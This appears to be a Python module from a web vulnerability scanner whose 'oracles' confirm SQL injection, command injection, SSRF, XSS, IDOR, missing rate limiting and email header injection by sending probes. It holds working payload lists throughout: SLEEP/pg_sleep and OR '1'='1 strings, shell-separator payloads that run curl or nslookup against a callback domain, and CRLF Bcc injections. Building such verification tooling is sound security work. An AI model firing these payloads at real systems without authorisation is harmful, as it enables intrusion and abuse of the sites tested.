"""Deterministic verification oracles.

Each oracle takes a Candidate + an HttpClient and returns a VerificationResult
whose verdict is derived only from observable, reproducible evidence — never from
a model's opinion. The five oracles map to the classes where a live signal is
actually decidable:

    TimingOracle       blind SQLi / blind command injection  → measured delay
    BooleanOracle      boolean-based blind SQLi              → response divergence
    ReflectionOracle   reflected XSS                         → raw marker in an executable context
    OastOracle         SSRF / blind RCE                      → out-of-band callback
    DifferentialOracle IDOR / BOLA / BFLA                    → cross-identity response diff

An out-of-band callback (OastOracle) is the strongest possible proof — the target
literally reached out and touched infrastructure the attacker controls — so it
scores confidence 1.0. The others are strong but in-band, so they cap lower.
"""

from __future__ import annotations

import difflib
import secrets
import statistics
from dataclasses import dataclass
from typing import Protocol
from urllib.parse import urlencode

from .http import HttpClient, HttpRequest, with_param
from .types import Candidate, Evidence, Verdict, VerificationResult, VulnClass

# Response statuses that mean "the request was accepted / processed" (not denied).
_ACCEPTED_STATUS = {200, 201, 202, 204, 301, 302, 303}


# ── request building ──────────────────────────────────────────────────────────
def _build_request(cand: Candidate, injected_value: str, extra_headers: dict | None = None) -> HttpRequest:
    """Produce an HttpRequest for `cand` with its injection point set to `injected_value`."""
    headers = {**cand.headers, **(extra_headers or {})}
    if cand.param_in == "query" and cand.param:
        return HttpRequest(cand.method, with_param(cand.target, cand.param, injected_value), headers)
    if cand.param_in == "body":
        # Co-submit the sibling form fields (benign) so a real form validates,
        # overriding just the injection point. With no param (pure form-abuse
        # replay) the whole benign form is sent as-is.
        fields = dict(cand.form_fields)
        if cand.param:
            fields[cand.param] = injected_value
        headers = {"Content-Type": "application/x-www-form-urlencoded", **headers}
        return HttpRequest(cand.method or "POST", cand.target, headers, urlencode(fields))
    if cand.param_in == "header" and cand.param:
        return HttpRequest(cand.method, cand.target, {**headers, cand.param: injected_value})
    # no injection point → send the target as-is
    return HttpRequest(cand.method, cand.target, headers)


def _similar(a: str, b: str) -> float:
    """Similarity ratio in [0,1] between two response bodies (order-insensitive to length)."""
    if not a and not b:
        return 1.0
    return difflib.SequenceMatcher(None, a, b).ratio()


# ── timing oracle (blind SQLi / blind command injection) ─────────────────────
# Payload builders take a delay in seconds and return the injected value.
_SQLI_TIME_PAYLOADS = [
    lambda b, d: f"{b}' AND SLEEP({d})-- -",           # MySQL, string context
    lambda b, d: f"{b}' AND pg_sleep({d})-- -",         # PostgreSQL
    lambda b, d: f"{b}'; WAITFOR DELAY '0:0:{int(d)}'-- -",  # MSSQL
    lambda b, d: f"{b} AND SLEEP({d})",                 # MySQL, numeric context
    lambda b, d: f"{b}' AND pg_sleep({d}) AND '1'='1",  # PostgreSQL, closed string
]
_CMDI_TIME_PAYLOADS = [
    lambda b, d: f"{b}; sleep {int(d)}",
    lambda b, d: f"{b}| sleep {int(d)}",
    lambda b, d: f"{b}$(sleep {int(d)})",
    lambda b, d: f"{b}`sleep {int(d)}`",
    lambda b, d: f"{b}&& sleep {int(d)}",
]


class TimingOracle:
    """Confirms time-based blind injection by proving the response time scales with
    an injected delay. Uses a baseline (delay 0) vs a test (delay D) and requires
    the observed gap to be a clear fraction of D, repeated to resist jitter."""

    name = "timing"

    def __init__(self, delay_s: float = 3.0, trials: int = 3, threshold: float = 0.6):
        self.delay_s = delay_s
        self.trials = trials
        self.threshold = threshold  # required gap as a fraction of the injected delay

    def _median_elapsed(self, client: HttpClient, cand: Candidate, payload: str) -> float:
        samples = []
        for _ in range(self.trials):
            samples.append(client.send(_build_request(cand, payload)).elapsed_ms)
        return statistics.median(samples)

    def verify(self, cand: Candidate, client: HttpClient) -> VerificationResult:
        builders = (_CMDI_TIME_PAYLOADS if cand.vuln_class == VulnClass.BLIND_CMDI
                    else _SQLI_TIME_PAYLOADS)
        base = cand.base_value or "1"
        baseline = self._median_elapsed(client, cand, base)  # delay 0 == benign value
        required_gap = self.delay_s * 1000.0 * self.threshold
        for build in builders:
            payload = build(base, self.delay_s)
            test = self._median_elapsed(client, cand, payload)
            gap = test - baseline
            if gap >= required_gap:
                ev = Evidence("timing",
                              f"injected {self.delay_s:g}s delay → response slowed by {gap/1000.0:.2f}s "
                              f"(baseline {baseline:.0f}ms, test {test:.0f}ms)",
                              {"baseline_ms": round(baseline, 1), "test_ms": round(test, 1),
                               "injected_delay_s": self.delay_s, "payload": payload})
                return VerificationResult(Verdict.CONFIRMED, cand.vuln_class, self.name, 0.9,
                                          [ev], "Response time scaled with the injected delay.",
                                          cand.source_rule)
        return VerificationResult(Verdict.INCONCLUSIVE, cand.vuln_class, self.name, 0.0, [],
                                  "No timing signal observed (not exploitable via time-based, "
                                  "or filtered — try boolean/OAST).", cand.source_rule)


# ── boolean oracle (boolean-based blind SQLi) ────────────────────────────────
class BooleanOracle:
    """Confirms boolean-based blind SQLi: a always-TRUE condition returns a page
    that matches the benign baseline, while an always-FALSE condition diverges."""

    name = "boolean"

    def __init__(self, high: float = 0.95, low: float = 0.90):
        self.high = high   # TRUE must be at least this similar to baseline
        self.low = low     # FALSE must be below this similar to baseline

    def verify(self, cand: Candidate, client: HttpClient) -> VerificationResult:
        base = cand.base_value or "1"
        baseline = client.send(_build_request(cand, base)).body
        true_body = client.send(_build_request(cand, f"{base}' OR '1'='1")).body
        false_body = client.send(_build_request(cand, f"{base}' AND '1'='2")).body
        st = _similar(true_body, baseline)
        sf = _similar(false_body, baseline)
        if st >= self.high and sf < self.low and _similar(true_body, false_body) < self.low:
            ev = Evidence("boolean",
                          f"TRUE condition matched baseline ({st:.2f}) while FALSE diverged ({sf:.2f})",
                          {"true_sim": round(st, 3), "false_sim": round(sf, 3)})
            return VerificationResult(Verdict.CONFIRMED, cand.vuln_class, self.name, 0.85, [ev],
                                      "Response tracked the injected boolean condition.",
                                      cand.source_rule)
        return VerificationResult(Verdict.INCONCLUSIVE, cand.vuln_class, self.name, 0.0, [],
                                  f"No boolean divergence (true_sim={st:.2f}, false_sim={sf:.2f}).",
                                  cand.source_rule)


# ── reflection oracle (reflected XSS) ────────────────────────────────────────
class ReflectionOracle:
    """Confirms reflected XSS by injecting a unique marker wrapped in angle
    brackets and checking whether it comes back *raw* (HTML-executable context) —
    as opposed to entity-encoded, which proves the sink is safe (→ REFUTED)."""

    name = "reflection"

    def verify(self, cand: Candidate, client: HttpClient) -> VerificationResult:
        token = "dnmh" + secrets.token_hex(4)
        raw = f"<{token}>"
        encoded = f"&lt;{token}&gt;"
        body = client.send(_build_request(cand, raw)).body
        if raw in body:
            ev = Evidence("reflection", f"marker <{token}> reflected raw (unencoded) in the response",
                          {"marker": token, "context": "raw-html"})
            return VerificationResult(Verdict.CONFIRMED, cand.vuln_class, self.name, 0.8, [ev],
                                      "Untrusted input reflected without HTML encoding — script "
                                      "injection is possible in this context.", cand.source_rule)
        if encoded in body or token in body:
            ev = Evidence("reflection", f"marker {token} reflected but HTML-encoded (angle brackets escaped)",
                          {"marker": token, "context": "encoded"})
            return VerificationResult(Verdict.REFUTED, cand.vuln_class, self.name, 0.7, [ev],
                                      "Input is reflected but output-encoded — not exploitable as XSS "
                                      "in this context (likely a false positive).", cand.source_rule)
        return VerificationResult(Verdict.INCONCLUSIVE, cand.vuln_class, self.name, 0.0, [],
                                  "Marker not reflected — no reflection sink at this parameter.",
                                  cand.source_rule)


# ── OAST oracle (SSRF / blind RCE — out-of-band) ─────────────────────────────
@dataclass
class Interaction:
    token: str
    protocol: str        # "http" | "dns"
    remote_addr: str
    at: float


class InteractionServer(Protocol):
    """An out-of-band interaction (OAST) service. Production plugs in a real
    collaborator (e.g. interactsh); tests use the in-memory one below."""
    def register(self) -> tuple[str, str]: ...        # -> (token, callback_domain)
    def poll(self, token: str) -> list[Interaction]: ...


class InMemoryInteractionServer:
    """A deterministic, in-process OAST server. `trigger()` records a callback the
    way a real collaborator would when the target fetches the payload URL — this
    is what makes SSRF/blind-RCE verification unit-testable without the internet."""

    def __init__(self, base_domain: str = "oast.local"):
        self.base_domain = base_domain
        self._log: dict[str, list[Interaction]] = {}

    def register(self) -> tuple[str, str]:
        token = "c" + secrets.token_hex(8)
        self._log[token] = []
        return token, f"{token}.{self.base_domain}"

    def trigger(self, domain_or_url: str, protocol: str = "http", remote_addr: str = "127.0.0.1") -> bool:
        import time
        for token in self._log:
            if token in domain_or_url:
                self._log[token].append(Interaction(token, protocol, remote_addr, time.time()))
                return True
        return False

    def poll(self, token: str) -> list[Interaction]:
        return list(self._log.get(token, []))


_SSRF_PAYLOADS = [
    lambda dom: f"http://{dom}/",
    lambda dom: f"http://{dom}",
    lambda dom: f"https://{dom}/",
]
_RCE_OOB_PAYLOADS = [
    lambda b, dom: f"{b}; curl http://{dom}/",
    lambda b, dom: f"{b}| curl http://{dom}/",
    lambda b, dom: f"{b}$(curl http://{dom}/)",
    lambda b, dom: f"{b}; nslookup {dom}",
]


class OastOracle:
    """Confirms SSRF / blind RCE by making the target reach an attacker-controlled
    callback host and observing the interaction. The gold-standard proof: the
    server actually initiated the request, so confidence is 1.0."""

    name = "oast"

    def __init__(self, server: InteractionServer):
        self.server = server

    def verify(self, cand: Candidate, client: HttpClient) -> VerificationResult:
        token, domain = self.server.register()
        if cand.vuln_class == VulnClass.BLIND_RCE:
            payloads = [b(cand.base_value or "1", domain) for b in _RCE_OOB_PAYLOADS]
        else:  # SSRF
            payloads = [b(domain) for b in _SSRF_PAYLOADS]
        for payload in payloads:
            client.send(_build_request(cand, payload))
        hits = self.server.poll(token)
        if hits:
            ev = Evidence("oob-interaction",
                          f"target initiated an out-of-band {hits[0].protocol} callback to the "
                          f"attacker-controlled host ({len(hits)} interaction(s))",
                          {"token": token, "domain": domain, "interactions": len(hits),
                           "remote_addr": hits[0].remote_addr})
            return VerificationResult(Verdict.CONFIRMED, cand.vuln_class, self.name, 1.0, [ev],
                                      "Out-of-band callback received — the server fetched a URL we "
                                      "controlled. Definitive proof.", cand.source_rule)
        return VerificationResult(Verdict.INCONCLUSIVE, cand.vuln_class, self.name, 0.0, [],
                                  "No out-of-band interaction observed within the polling window.",
                                  cand.source_rule)


# ── differential oracle (IDOR / BOLA / BFLA) ─────────────────────────────────
_DENIED_STATUS = {401, 403, 404}


class DifferentialOracle:
    """Confirms broken access control by replaying the same request under two
    identities. If an *unauthorised* identity receives the authorised identity's
    protected response (same success + content, or the owner-only marker), access
    control is broken. If every unauthorised identity is denied, it's REFUTED."""

    name = "differential"

    def __init__(self, sim_threshold: float = 0.95):
        self.sim_threshold = sim_threshold

    def verify(self, cand: Candidate, client: HttpClient) -> VerificationResult:
        authed = [i for i in cand.identities if i.authorized]
        others = [i for i in cand.identities if not i.authorized]
        if not authed or not others:
            return VerificationResult(Verdict.INCONCLUSIVE, cand.vuln_class, self.name, 0.0, [],
                                      "Need one authorised and at least one unauthorised identity to "
                                      "compare.", cand.source_rule)
        owner = authed[0]
        owner_resp = client.send(_build_request(cand, cand.base_value, owner.headers))
        denied_all = True
        for ident in others:
            resp = client.send(_build_request(cand, cand.base_value, ident.headers))
            marker_leaked = bool(cand.owner_marker) and cand.owner_marker in resp.body
            looks_same = (resp.status == owner_resp.status
                          and resp.status not in _DENIED_STATUS
                          and _similar(resp.body, owner_resp.body) >= self.sim_threshold)
            if marker_leaked or looks_same:
                why = ("owner-only marker leaked to" if marker_leaked
                       else "protected response served to")
                ev = Evidence("response-diff",
                              f"{why} unauthorised identity '{ident.name}' "
                              f"(status {resp.status})",
                              {"identity": ident.name, "status": resp.status,
                               "marker_leaked": marker_leaked})
                return VerificationResult(Verdict.CONFIRMED, cand.vuln_class, self.name, 0.9, [ev],
                                          "An unauthorised identity accessed a protected resource — "
                                          "authorization is missing.", cand.source_rule)
            if resp.status not in _DENIED_STATUS:
                denied_all = False
        if denied_all:
            ev = Evidence("response-diff", "every unauthorised identity was denied (401/403/404)",
                          {"identities": [i.name for i in others]})
            return VerificationResult(Verdict.REFUTED, cand.vuln_class, self.name, 0.8, [ev],
                                      "Access control held for all tested identities — not an IDOR.",
                                      cand.source_rule)
        return VerificationResult(Verdict.INCONCLUSIVE, cand.vuln_class, self.name, 0.0, [],
                                  "Mixed responses — no clear authorization breach or denial.",
                                  cand.source_rule)


# ── rate-limit oracle (form abuse / mail flooding — no throttling) ───────────
# Signals in a response body that the endpoint is throttling or challenging us.
_THROTTLE_SIGNALS = (
    "too many requests", "rate limit", "rate-limit", "ratelimit", "try again later",
    "slow down", "please wait", "temporarily blocked", "captcha", "recaptcha",
    "hcaptcha", "turnstile", "verification required", "are you a robot",
)


class RateLimitOracle:
    """Confirms a state-changing form has NO rate limiting by replaying the same
    benign submission in a tight burst. If every replay is accepted with no 429
    and no throttle/CAPTCHA challenge, the endpoint can be automated for abuse
    (contact-form spam, mail flooding, resource exhaustion). A 429 or a challenge
    appearing part-way through REFUTES it — limiting is in place.

    Deterministic and in-band: the verdict is read purely from the observed
    status codes and throttle keywords across the burst, never from a guess."""

    name = "rate-limit"

    def __init__(self, burst: int = 8):
        self.burst = burst

    def verify(self, cand: Candidate, client: HttpClient) -> VerificationResult:
        base = cand.base_value or "test"
        statuses: list[int] = []
        for _ in range(self.burst):
            resp = client.send(_build_request(cand, base))
            statuses.append(resp.status)
            body_low = (resp.body or "").lower()
            throttled = resp.status == 429 or any(s in body_low for s in _THROTTLE_SIGNALS)
            if throttled:
                ev = Evidence("rate-limit",
                              f"throttled after {len(statuses)} rapid submission(s) "
                              f"(status {resp.status})",
                              {"requests_before_throttle": len(statuses),
                               "status": resp.status, "statuses": statuses})
                return VerificationResult(Verdict.REFUTED, cand.vuln_class, self.name, 0.85, [ev],
                                          "The endpoint rate-limits / challenges repeated "
                                          "submissions — not abusable.", cand.source_rule)
        if all(s in _ACCEPTED_STATUS for s in statuses):
            ev = Evidence("rate-limit",
                          f"{self.burst} identical submissions in a burst were all accepted "
                          f"(status {statuses[0]}) with no 429 and no CAPTCHA/throttle",
                          {"burst": self.burst, "statuses": statuses})
            return VerificationResult(Verdict.CONFIRMED, cand.vuln_class, self.name, 0.7, [ev],
                                      "No rate limiting: the form accepts unlimited automated "
                                      "submissions, so it can be scripted for spam / mail "
                                      "flooding. Add per-IP rate limiting, a CAPTCHA, or a "
                                      "one-time form token.", cand.source_rule)
        return VerificationResult(Verdict.INCONCLUSIVE, cand.vuln_class, self.name, 0.0, [],
                                  f"Submissions were not consistently accepted (statuses "
                                  f"{statuses}) — can't confirm the form is abusable.",
                                  cand.source_rule)


# ── email header injection oracle (CRLF into mail headers) ───────────────────
# Each payload appends a header-injecting sequence after the benign value. The
# out-of-band variants add a Bcc/Cc to an attacker-controlled address so a naive
# mailer that concatenates the field into the header block delivers a copy.
_EMAIL_HDR_PAYLOADS = [
    lambda b, tok, dom: f"{b}\r\nBcc: {tok}@{dom}",
    lambda b, tok, dom: f"{b}\nBcc: {tok}@{dom}",
    lambda b, tok, dom: f"{b}%0d%0aBcc:{tok}@{dom}",
    lambda b, tok, dom: f"{b}\r\nCc: {tok}@{dom}\r\nX-Probe: {tok}",
]


class EmailHeaderInjectionOracle:
    """Confirms email/SMTP header injection (CRLF into a mail header) — the class
    that hits naive contact forms that drop a user field straight into the mail
    header block.

    Gold-standard proof is out-of-band: an injected `Bcc:` to an attacker address
    causes a real delivery, observed via the interaction server (confidence 1.0).
    With no email-capable OAST server available it falls back to an in-band
    differential: benign submission accepted but the CRLF payload rejected proves
    the input is validated (REFUTED); anything else is a lead needing OAST email
    confirmation (INCONCLUSIVE) — it never *confirms* header injection in-band,
    because the effect lands in the email, not the HTTP response."""

    name = "email-header"

    def __init__(self, server: InteractionServer | None = None):
        self.server = server

    def verify(self, cand: Candidate, client: HttpClient) -> VerificationResult:
        base = cand.base_value or "probe@example.com"
        baseline = client.send(_build_request(cand, base))

        token, domain = (self.server.register() if self.server else ("", "oast.local"))
        last = baseline
        for build in _EMAIL_HDR_PAYLOADS:
            payload = build(base, token or "probe", domain)
            last = client.send(_build_request(cand, payload))
            if self.server and token and self.server.poll(token):
                hits = self.server.poll(token)
                ev = Evidence("oob-interaction",
                              f"injected Bcc header triggered an out-of-band "
                              f"{hits[0].protocol} delivery to the attacker address "
                              f"{token}@{domain}",
                              {"token": token, "domain": domain,
                               "interactions": len(hits), "payload": payload})
                return VerificationResult(Verdict.CONFIRMED, cand.vuln_class, self.name, 1.0, [ev],
                                          "The mailer honoured an injected header — the CRLF "
                                          "sequence in this field reaches the mail header block. "
                                          "Definitive out-of-band proof.", cand.source_rule)

        # In-band differential (no email OAST): did validation reject the CRLF?
        rejected = (last.status not in _ACCEPTED_STATUS
                    and baseline.status in _ACCEPTED_STATUS)
        if rejected:
            ev = Evidence("response-diff",
                          f"benign value accepted (status {baseline.status}) but the "
                          f"CRLF header payload was rejected (status {last.status})",
                          {"baseline_status": baseline.status, "payload_status": last.status})
            return VerificationResult(Verdict.REFUTED, cand.vuln_class, self.name, 0.7, [ev],
                                      "The field rejects CRLF / header-injection input — not "
                                      "exploitable as email header injection.", cand.source_rule)
        return VerificationResult(Verdict.INCONCLUSIVE, cand.vuln_class, self.name, 0.0, [],
                                  "The field accepts CRLF header-injection input without error, "
                                  "but the effect lands in the outgoing email, not the HTTP "
                                  "response. Confirm out-of-band: inject 'Bcc: you@oast' and "
                                  "check whether a copy is delivered.", cand.source_rule)
